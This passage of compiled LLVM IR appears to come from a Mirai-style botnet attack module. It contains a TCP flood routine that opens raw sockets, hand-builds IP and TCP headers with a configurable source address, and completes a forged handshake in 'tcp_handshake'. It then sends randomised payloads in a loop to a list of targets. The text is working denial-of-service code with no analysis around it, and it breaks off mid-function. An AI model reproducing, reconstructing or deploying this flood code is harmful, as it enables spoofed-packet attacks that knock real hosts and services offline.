  %22 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 17, i16 zeroext -1)
  %23 = load i32, i32* @LOCAL_ADDRESS, align 4
  %24 = tail call i32 @retrieve_opt_ipv4(%struct.option* %5, i8 zeroext %7, i8 zeroext 18, i32 %23)
  %25 = load %struct.option*, %struct.option** %4, align 8
  %26 = load i8, i8* %6, align 8
  %27 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %25, i8 zeroext %26, i8 zeroext 19, i16 zeroext -1)
  %28 = tail call i8* @retrieve_opt_str(%struct.option* %25, i8 zeroext %26, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %29 = ptrtoint i8* %28 to i64
  %30 = trunc i64 %29 to i32
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = tail call noalias i8* @calloc(i64 %33, i64 8) #13
  %35 = bitcast i8* %34 to i8**
  %36 = icmp eq i8* %34, null
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:38:                                     ; preds = %1
  %39 = tail call noalias i8* @calloc(i64 %33, i64 4) #13
  %40 = bitcast i8* %39 to i32*
  %41 = icmp eq i8* %39, null
  br i1 %41, label %119, label %.preheader152

.preheader152:                                    ; preds = %38
  %42 = icmp eq i8 %32, 0
  br i1 %42, label %.preheader152..preheader_crit_edge, label %.lr.ph155

.preheader152..preheader_crit_edge:               ; preds = %.preheader152
  %.pre = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  br label %.preheader

.lr.ph155:                                        ; preds = %.preheader152
  %43 = bitcast i32* %2 to i8*
  %44 = icmp eq i32 %30, 0
  %45 = zext i16 %8 to i32
  %46 = add nuw nsw i32 %45, 110
  %47 = zext i32 %46 to i64
  %48 = add i16 %8, 40
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %50 = shl i16 %13, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %14, 8
  %53 = and i16 %52, 256
  %54 = shl i16 %15, 13
  %55 = and i16 %54, 8192
  %56 = shl i16 %16, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %17, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %18, 9
  %61 = and i16 %60, 512
  %62 = or i16 %51, %53
  %63 = or i16 %62, %55
  %64 = or i16 %63, %57
  %.masked = or i16 %64, %59
  %65 = or i16 %.masked, %61
  %66 = or i16 %65, 80
  %67 = zext i16 %12 to i32
  br i1 %44, label %.lr.ph155.split.us.preheader, label %.lr.ph155.split.preheader

.lr.ph155.split.preheader:                        ; preds = %.lr.ph155
  br label %.lr.ph155.split

.lr.ph155.split.us.preheader:                     ; preds = %.lr.ph155
  br label %.lr.ph155.split.us

.lr.ph155.split.us:                               ; preds = %.lr.ph155.split.us.preheader, %78
  %indvars.iv162 = phi i64 [ %indvars.iv.next163, %78 ], [ 0, %.lr.ph155.split.us.preheader ]
  %68 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %69 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv162
  store i32 %68, i32* %69, align 4
  %70 = icmp eq i32 %68, -1
  br i1 %70, label %.us-lcssa.us.loopexit, label %71

; <label>:71:                                     ; preds = %.lr.ph155.split.us
  store i32 1, i32* %2, align 4
  %72 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* nonnull %43, i32 4) #13
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %.us-lcssa156.us.loopexit, label %74

; <label>:74:                                     ; preds = %71
  %75 = call noalias i8* @malloc(i64 %47) #13
  %76 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv162
  store i8* %75, i8** %76, align 8
  %77 = icmp eq i8* %75, null
  br i1 %77, label %.us-lcssa157.us.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %75, i64 20
  %80 = getelementptr inbounds i8, i8* %75, i64 40
  %81 = getelementptr inbounds i8, i8* %75, i64 1
  store i8 %20, i8* %81, align 1
  %82 = call zeroext i16 @htons(i16 zeroext %48) #14
  %83 = getelementptr inbounds i8, i8* %75, i64 2
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  store i8 69, i8* %75, align 4
  %85 = getelementptr inbounds i8, i8* %75, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 0, i16* %86, align 2
  %87 = getelementptr inbounds i8, i8* %75, i64 8
  store i8 %11, i8* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext %21) #14
  %89 = getelementptr inbounds i8, i8* %75, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %75, i64 9
  store i8 6, i8* %91, align 1
  %92 = getelementptr inbounds i8, i8* %75, i64 12
  %93 = bitcast i8* %92 to i32*
  store i32 %24, i32* %93, align 4
  %94 = load %struct.target*, %struct.target** %49, align 8
  %95 = getelementptr inbounds %struct.target, %struct.target* %94, i64 %indvars.iv162, i32 0
  %96 = load i32, i32* %95, align 4
  %97 = getelementptr inbounds i8, i8* %75, i64 16
  %98 = bitcast i8* %97 to i32*
  store i32 %96, i32* %98, align 4
  %99 = call zeroext i16 @htons(i16 zeroext %9) #14
  %100 = getelementptr inbounds i8, i8* %75, i64 22
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %12) #14
  %103 = bitcast i8* %79 to i16*
  store i16 %102, i16* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %22) #14
  %105 = zext i16 %104 to i32
  %106 = getelementptr inbounds i8, i8* %75, i64 24
  %107 = bitcast i8* %106 to i32*
  store i32 %105, i32* %107, align 4
  %108 = getelementptr inbounds i8, i8* %75, i64 32
  %109 = bitcast i8* %108 to i16*
  store i16 %66, i16* %109, align 4
  %110 = getelementptr inbounds i8, i8* %75, i64 34
  %111 = bitcast i8* %110 to i16*
  store i16 0, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %27) #14
  %113 = zext i16 %112 to i32
  %114 = getelementptr inbounds i8, i8* %75, i64 28
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  call void @rand_string(i8* %80, i32 %45)
  %indvars.iv.next163 = add nuw i64 %indvars.iv162, 1
  %116 = load i8, i8* %31, align 1
  %117 = zext i8 %116 to i64
  %118 = icmp slt i64 %indvars.iv.next163, %117
  br i1 %118, label %.lr.ph155.split.us, label %.preheader.loopexit

; <label>:119:                                    ; preds = %38
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %78
  br label %.preheader

.preheader.loopexit181:                           ; preds = %144
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit181, %.preheader.loopexit, %.preheader152..preheader_crit_edge
  %.pre-phi = phi %struct.target** [ %.pre, %.preheader152..preheader_crit_edge ], [ %49, %.preheader.loopexit ], [ %49, %.preheader.loopexit181 ]
  %120 = phi i8 [ 0, %.preheader152..preheader_crit_edge ], [ %116, %.preheader.loopexit ], [ %182, %.preheader.loopexit181 ]
  %121 = zext i16 %8 to i64
  %122 = add nuw nsw i64 %121, 20
  %123 = trunc i64 %122 to i16
  %124 = trunc i64 %122 to i32
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %127 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %128 = add nuw nsw i64 %121, 40
  %129 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %.loopexit

.lr.ph155.split:                                  ; preds = %.lr.ph155.split.preheader, %144
  %indvars.iv164 = phi i64 [ %indvars.iv.next165, %144 ], [ 0, %.lr.ph155.split.preheader ]
  %130 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %131 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv164
  store i32 %130, i32* %131, align 4
  %132 = icmp eq i32 %130, -1
  br i1 %132, label %.us-lcssa.us.loopexit178, label %133

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph155.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit178:                         ; preds = %.lr.ph155.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit178, %.us-lcssa.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:133:                                    ; preds = %.lr.ph155.split
  store i32 1, i32* %2, align 4
  %134 = call i32 @setsockopt(i32 %130, i32 0, i32 3, i8* nonnull %43, i32 4) #13
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %.us-lcssa156.us.loopexit179, label %136

.us-lcssa156.us.loopexit:                         ; preds = %71
  br label %.us-lcssa156.us

.us-lcssa156.us.loopexit179:                      ; preds = %133
  br label %.us-lcssa156.us

.us-lcssa156.us:                                  ; preds = %.us-lcssa156.us.loopexit179, %.us-lcssa156.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:136:                                    ; preds = %133
  %137 = load %struct.target*, %struct.target** %49, align 8
  %138 = getelementptr inbounds %struct.target, %struct.target* %137, i64 %indvars.iv164, i32 0
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @tcp_handshake(i16 zeroext %9, i32 %130, i32 %139, i32 %24, i32 %67)
  %141 = call noalias i8* @malloc(i64 %47) #13
  %142 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv164
  store i8* %141, i8** %142, align 8
  %143 = icmp eq i8* %141, null
  br i1 %143, label %.us-lcssa157.us.loopexit180, label %144

.us-lcssa157.us.loopexit:                         ; preds = %74
  br label %.us-lcssa157.us

.us-lcssa157.us.loopexit180:                      ; preds = %136
  br label %.us-lcssa157.us

.us-lcssa157.us:                                  ; preds = %.us-lcssa157.us.loopexit180, %.us-lcssa157.us.loopexit
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:144:                                    ; preds = %136
  %145 = getelementptr inbounds i8, i8* %141, i64 20
  %146 = getelementptr inbounds i8, i8* %141, i64 40
  %147 = getelementptr inbounds i8, i8* %141, i64 1
  store i8 %20, i8* %147, align 1
  %148 = call zeroext i16 @htons(i16 zeroext %48) #14
  %149 = getelementptr inbounds i8, i8* %141, i64 2
  %150 = bitcast i8* %149 to i16*
  store i16 %148, i16* %150, align 2
  store i8 69, i8* %141, align 4
  %151 = getelementptr inbounds i8, i8* %141, i64 6
  %152 = bitcast i8* %151 to i16*
  store i16 0, i16* %152, align 2
  %153 = getelementptr inbounds i8, i8* %141, i64 8
  store i8 %11, i8* %153, align 4
  %154 = call zeroext i16 @htons(i16 zeroext %21) #14
  %155 = getelementptr inbounds i8, i8* %141, i64 4
  %156 = bitcast i8* %155 to i16*
  store i16 %154, i16* %156, align 4
  %157 = getelementptr inbounds i8, i8* %141, i64 9
  store i8 6, i8* %157, align 1
  %158 = getelementptr inbounds i8, i8* %141, i64 12
  %159 = bitcast i8* %158 to i32*
  store i32 %24, i32* %159, align 4
  %160 = load %struct.target*, %struct.target** %49, align 8
  %161 = getelementptr inbounds %struct.target, %struct.target* %160, i64 %indvars.iv164, i32 0
  %162 = load i32, i32* %161, align 4
  %163 = getelementptr inbounds i8, i8* %141, i64 16
  %164 = bitcast i8* %163 to i32*
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext %9) #14
  %166 = getelementptr inbounds i8, i8* %141, i64 22
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 zeroext %12) #14
  %169 = bitcast i8* %145 to i16*
  store i16 %168, i16* %169, align 4
  %170 = call zeroext i16 @htons(i16 zeroext %22) #14
  %171 = zext i16 %170 to i32
  %172 = getelementptr inbounds i8, i8* %141, i64 24
  %173 = bitcast i8* %172 to i32*
  store i32 %171, i32* %173, align 4
  %174 = getelementptr inbounds i8, i8* %141, i64 32
  %175 = bitcast i8* %174 to i16*
  store i16 %66, i16* %175, align 4
  %176 = getelementptr inbounds i8, i8* %141, i64 34
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %27) #14
  %179 = zext i16 %178 to i32
  %180 = getelementptr inbounds i8, i8* %141, i64 28
  %181 = bitcast i8* %180 to i32*
  store i32 %179, i32* %181, align 4
  call void @rand_string(i8* %146, i32 %45)
  %indvars.iv.next165 = add nuw i64 %indvars.iv164, 1
  %182 = load i8, i8* %31, align 1
  %183 = zext i8 %182 to i64
  %184 = icmp slt i64 %indvars.iv.next165, %183
  br i1 %184, label %.lr.ph155.split, label %.preheader.loopexit181

.loopexit.loopexit:                               ; preds = %233
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %185 = phi i8 [ %120, %.preheader ], [ %.be, %.loopexit.backedge ]
  %186 = icmp eq i8 %185, 0
  br i1 %186, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %248, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %233
  %indvars.iv = phi i64 [ %indvars.iv.next, %233 ], [ 0, %.lr.ph.preheader ]
  %187 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv
  %188 = bitcast i8** %187 to %struct.iphdr**
  %189 = load %struct.iphdr*, %struct.iphdr** %188, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1
  %191 = load %struct.target*, %struct.target** %.pre-phi, align 8
  %192 = getelementptr inbounds %struct.target, %struct.target* %191, i64 %indvars.iv, i32 1
  %193 = load i16, i16* %192, align 4
  %194 = icmp ult i16 %193, 32
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 0
  br i1 %194, label %196, label %201

; <label>:196:                                    ; preds = %.lr.ph
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 9
  %198 = load i32, i32* %197, align 4
  %199 = call i32 @ntohl(i32 %198) #14
  %200 = call i32 @htonl(i32 %199) #14
  store i32 %200, i32* %197, align 4
  br label %201

; <label>:201:                                    ; preds = %196, %.lr.ph
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 8
  %203 = load i32, i32* %202, align 4
  %204 = icmp eq i32 %203, -1
  br i1 %204, label %205, label %206

; <label>:205:                                    ; preds = %201
  store i32 0, i32* %202, align 4
  br label %206

; <label>:206:                                    ; preds = %205, %201
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 3
  %208 = load i16, i16* %207, align 4
  %209 = icmp eq i16 %208, -1
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %206
  store i16 0, i16* %207, align 4
  br label %211

; <label>:211:                                    ; preds = %210, %206
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 2
  %213 = load i16, i16* %212, align 2
  %214 = icmp eq i16 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %211
  store i16 0, i16* %212, align 2
  br label %216

; <label>:216:                                    ; preds = %215, %211
  %217 = bitcast %struct.iphdr* %190 to i16*
  %218 = load i16, i16* %217, align 4
  %219 = icmp eq i16 %218, -1
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %216
  store i16 0, i16* %217, align 4
  br label %221

; <label>:221:                                    ; preds = %220, %216
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 3
  %223 = bitcast i16* %222 to i32*
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 65535
  br i1 %225, label %226, label %227

; <label>:226:                                    ; preds = %221
  store i32 0, i32* %223, align 4
  br label %227

; <label>:227:                                    ; preds = %226, %221
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 5
  %229 = bitcast i8* %228 to i32*
  %230 = load i32, i32* %229, align 4
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %227
  store i32 0, i32* %229, align 4
  br label %233

; <label>:233:                                    ; preds = %232, %227
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 7
  store i16 0, i16* %234, align 2
  %235 = bitcast %struct.iphdr* %189 to i16*
  %236 = call zeroext i16 @ip_header_checksum(i16* %235, i32 20) #13
  store i16 %236, i16* %234, align 2
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 9
  %238 = bitcast i32* %237 to i16*
  store i16 0, i16* %238, align 4
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i64 0, i32 0
  %240 = call zeroext i16 @htons(i16 zeroext %123) #14
  %241 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* nonnull %189, i8* %239, i16 zeroext %240, i32 %124) #13
  store i16 %241, i16* %238, align 4
  store i16 2, i16* %125, align 4
  %242 = load i16, i16* %212, align 2
  store i16 %242, i16* %126, align 2
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 9
  %244 = load i32, i32* %243, align 4
  store i32 %244, i32* %127, align 4
  %245 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv
  %246 = load i32, i32* %245, align 4
  %247 = call i64 @sendto(i32 %246, i8* nonnull %195, i64 %128, i32 16384, %struct.sockaddr* nonnull %129, i32 16) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %248 = load i8, i8* %31, align 1
  %249 = zext i8 %248 to i64
  %250 = icmp slt i64 %indvars.iv.next, %249
  br i1 %250, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @tcp_handshake(i16 zeroext, i32, i32, i32, i32) local_unnamed_addr #3 {
  %6 = alloca [40 x i8], align 16
  %7 = alloca [40 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca <2 x i64>, align 16
  %11 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 40, i32 16, i1 false)
  %12 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %12, i8 0, i64 40, i32 16, i1 false)
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 512, i32 16, i1 false)
  %14 = bitcast [40 x i8]* %6 to %struct.iphdr*
  %15 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 20
  store i8 69, i8* %11, align 16
  %16 = tail call zeroext i16 @htons(i16 zeroext 40) #14
  %17 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 2
  %18 = bitcast i8* %17 to i16*
  store i16 %16, i16* %18, align 2
  %19 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 8
  store i8 64, i8* %19, align 8
  %20 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 9
  store i8 6, i8* %20, align 1
  %21 = tail call zeroext i16 @htons(i16 zeroext %0) #14
  %22 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 22
  %23 = bitcast i8* %22 to i16*
  store i16 %21, i16* %23, align 2
  %24 = trunc i32 %4 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #14
  %26 = bitcast i8* %15 to i16*
  store i16 %25, i16* %26, align 4
  %27 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 32
  %28 = bitcast i8* %27 to i16*
  %29 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 34
  %30 = bitcast i8* %29 to i16*
  store i16 0, i16* %30, align 2
  store i16 592, i16* %28, align 16
  %31 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 28
  %32 = bitcast i8* %31 to i32*
  store i32 0, i32* %32, align 4
  %33 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 4
  %34 = bitcast i8* %33 to i16*
  store i16 0, i16* %34, align 4
  %35 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 12
  %36 = bitcast i8* %35 to i32*
  store i32 %3, i32* %36, align 4
  %37 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 16
  %38 = bitcast i8* %37 to i32*
  store i32 %2, i32* %38, align 16
  %39 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 10
  %40 = bitcast i8* %39 to i16*
  store i16 0, i16* %40, align 2
  %41 = bitcast [40 x i8]* %6 to i16*
  %42 = call zeroext i16 @checksum_generic(i16* nonnull %41, i32 20)
  store i16 %42, i16* %40, align 2
  %43 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 24
  %44 = bitcast i8* %43 to i32*
  store i32 0, i32* %44, align 8
  %45 = getelementptr inbounds [40 x i8], [40 x i8]* %6, i64 0, i64 36
  %46 = bitcast i8* %45 to i16*
  store i16 0, i16* %46, align 4
  %47 = tail call zeroext i16 @htons(i16 zeroext 20) #14
  %48 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %14, i8* %15, i16 zeroext %47, i32 20)
  store i16 %48, i16* %46, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %21, i16* %50, align 2
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2, i32 0
  store i32 %2, i32* %51, align 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* nonnull %11, i64 40, i32 16, i1 false)
  %52 = tail call i32 @ntohl(i32 0) #14
  %53 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %52, i32 %52)
  %54 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %55 = call i64 @sendto(i32 %1, i8* nonnull %11, i64 40, i32 16384, %struct.sockaddr* nonnull %54, i32 16) #13
  %56 = trunc i64 %55 to i32
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %127, label %58

; <label>:58:                                     ; preds = %5
  store <2 x i64> <i64 5, i64 0>, <2 x i64>* %10, align 16
  %59 = bitcast <2 x i64>* %10 to i8*
  %60 = call i32 @setsockopt(i32 %1, i32 1, i32 20, i8* nonnull %59, i32 16) #13
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %127, label %.preheader

.preheader:                                       ; preds = %58
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 12
  %63 = bitcast i8* %62 to i32*
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 32
  %65 = bitcast i8* %64 to i16*
  br label %66

; <label>:66:                                     ; preds = %.preheader, %123
  %.08183 = phi i32 [ 0, %.preheader ], [ %124, %123 ]
  %67 = call i64 @recvfrom(i32 %1, i8* nonnull %13, i64 512, i32 16384, %struct.sockaddr* null, i32* null) #13
  %68 = trunc i64 %67 to i32
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %.loopexit.loopexit, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %63, align 4
  %72 = icmp eq i32 %71, %2
  br i1 %72, label %73, label %123

; <label>:73:                                     ; preds = %70
  %74 = load i16, i16* %65, align 16
  %75 = and i16 %74, 4608
  %76 = icmp eq i16 %75, 4608
  br i1 %76, label %77, label %123

; <label>:77:                                     ; preds = %73
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 28
  %79 = bitcast i8* %78 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = call i32 @ntohl(i32 %80) #14
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 24
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 8
  %85 = call i32 @ntohl(i32 %84) #14
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0), i32 %81, i32 %85)
  %87 = load i32, i32* %83, align 8
  %88 = call i32 @ntohl(i32 %87) #14
  %89 = add i32 %88, 1
  %90 = call i32 @htonl(i32 %89) #14
  %91 = load i32, i32* %79, align 4
  %92 = bitcast [40 x i8]* %7 to %struct.iphdr*
  %93 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 20
  %94 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 32
  %95 = bitcast i8* %94 to i16*
  %96 = load i16, i16* %95, align 16
  %97 = and i16 %96, -16129
  %98 = or i16 %97, 4096
  store i16 %98, i16* %95, align 16
  %99 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 28
  %100 = bitcast i8* %99 to i32*
  store i32 %90, i32* %100, align 4
  %101 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 24
  %102 = bitcast i8* %101 to i32*
  store i32 %91, i32* %102, align 8
  %103 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 4
  %104 = bitcast i8* %103 to i16*
  store i16 0, i16* %104, align 4
  %105 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 10
  %106 = bitcast i8* %105 to i16*
  store i16 0, i16* %106, align 2
  %107 = bitcast [40 x i8]* %7 to i16*
  %108 = call zeroext i16 @checksum_generic(i16* nonnull %107, i32 20)
  store i16 %108, i16* %106, align 2
  %109 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 36
  %110 = bitcast i8* %109 to i16*
  store i16 0, i16* %110, align 4
  %111 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %92, i8* %93, i16 zeroext %47, i32 20)
  store i16 %111, i16* %110, align 4
  store i16 2, i16* %49, align 4
  %112 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 22
  %113 = bitcast i8* %112 to i16*
  %114 = load i16, i16* %113, align 2
  store i16 %114, i16* %50, align 2
  %115 = getelementptr inbounds [40 x i8], [40 x i8]* %7, i64 0, i64 16
  %116 = bitcast i8* %115 to i32*
  %117 = load i32, i32* %116, align 16
  store i32 %117, i32* %51, align 4
  %118 = call i32 @ntohl(i32 %90) #14
  %119 = call i32 @ntohl(i32 %91) #14
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %118, i32 %119)
  %121 = call i64 @sendto(i32 %1, i8* nonnull %12, i64 40, i32 16384, %struct.sockaddr* nonnull %54, i32 16) #13
  %122 = trunc i64 %121 to i32
  br label %.loopexit

; <label>:123:                                    ; preds = %73, %70
  %124 = add nuw nsw i32 %.08183, 1
  %125 = icmp slt i32 %124, 10000
  br i1 %125, label %66, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %123, %66
  %.1.ph = phi i32 [ %68, %123 ], [ -1, %66 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %77
  %.1 = phi i32 [ %122, %77 ], [ %.1.ph, %.loopexit.loopexit ]
  %not. = icmp ne i32 %.1, -1
  %126 = zext i1 %not. to i32
  br label %127

; <label>:127:                                    ; preds = %58, %5, %.loopexit
  %.0 = phi i32 [ %126, %.loopexit ], [ 0, %5 ], [ 0, %58 ]
  ret i32 %.0
}

declare zeroext i16 @ip_header_checksum(i16*, i32) local_unnamed_addr #9

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
